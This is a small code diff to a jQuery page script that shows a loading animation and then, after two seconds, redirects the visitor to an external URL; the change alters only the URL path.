@@ -5,7 +5,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://anjayhostjon.cloud/wa/v4-putra';
+location.href='https://anjayhostjon.cloud/wa/v4-ptra';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
